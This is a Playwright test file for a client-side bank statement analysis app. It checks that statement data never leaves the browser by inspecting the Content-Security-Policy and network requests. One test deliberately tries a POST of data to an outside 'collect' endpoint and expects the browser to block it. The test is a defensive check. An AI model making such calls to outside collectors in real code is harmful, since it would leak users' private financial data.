import { test as plain } from '@playwright/test';
import { expect, fixture, loadSample, test } from './helpers';

// The privacy promise, tested: during a full run no request goes anywhere but the site itself,
// none carries a body, and the document is served with a policy that forbids other connections.
test('statement data never leaves the browser', async ({ page, baseURL }) => {
  const origin = new URL(baseURL ?? 'http://localhost:4173').origin;
  const requests: { url: string; method: string; body: string | null }[] = [];
  const sockets: string[] = [];
  page.on('request', (r) => requests.push({ url: r.url(), method: r.method(), body: r.postData() }));
  page.on('websocket', (w) => sockets.push(w.url()));

  const response = await page.goto('/');
  expect(response?.headers()['content-security-policy']).toContain("connect-src 'self'");
  expect(response?.headers()['content-security-policy']).toContain("default-src 'none'");

  await page.getByTestId('file-input').setInputFiles([fixture('hdfc.csv'), fixture('icici.xlsx'), fixture('hdfc-text.pdf')]);
  await expect(page.getByTestId('headline')).toBeVisible();
  await page.getByTestId('item-row').first().getByRole('radio', { name: 'Cancel' }).click();
  await page.getByTestId('share-open').click();
  await expect(page.getByTestId('share-download')).toBeVisible();
  await page.keyboard.press('Escape');
  await page.getByRole('button', { name: 'Start over' }).click();

  await page.getByTestId('file-input').setInputFiles(fixture('hdfc-password.pdf'));
  await page.getByTestId('pdf-password').fill('01011990');
  await page.getByTestId('pdf-password-submit').click();
  await expect(page.getByTestId('headline')).toBeVisible();

  await page.getByRole('button', { name: 'Start over' }).click();
  await page.getByTestId('sample-button').click();
  await expect(page.getByTestId('headline')).toBeVisible();

  const foreign = requests.filter((r) => !(r.url.startsWith(origin) || r.url.startsWith('blob:') || r.url.startsWith('data:')));
  expect(foreign).toEqual([]);
  expect(requests.filter((r) => r.method !== 'GET')).toEqual([]);
  expect(requests.filter((r) => r.body)).toEqual([]);
  expect(sockets).toEqual([]);
  expect(requests.length).toBeGreaterThan(5);
});

plain('the browser refuses a connection to another site even if the code tried', async ({ page }) => {
  await page.goto('/');
  await expect(page.getByRole('heading', { level: 1 })).toBeVisible();
  const result = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/collect', { method: 'POST', body: 'x', mode: 'no-cors' });
      return 'sent';
    } catch (e) {
      return (e as Error).name;
    }
  });
  expect(result).not.toBe('sent');
});

test('every page works with scripts from other origins blocked and nothing third party loaded', async ({ page }) => {
  await loadSample(page);
  const external = await page.evaluate(() =>
    performance
      .getEntriesByType('resource')
      .map((e) => e.name)
      .filter((u) => !u.startsWith(location.origin) && !u.startsWith('blob:') && !u.startsWith('data:')),
  );
  expect(external).toEqual([]);
});
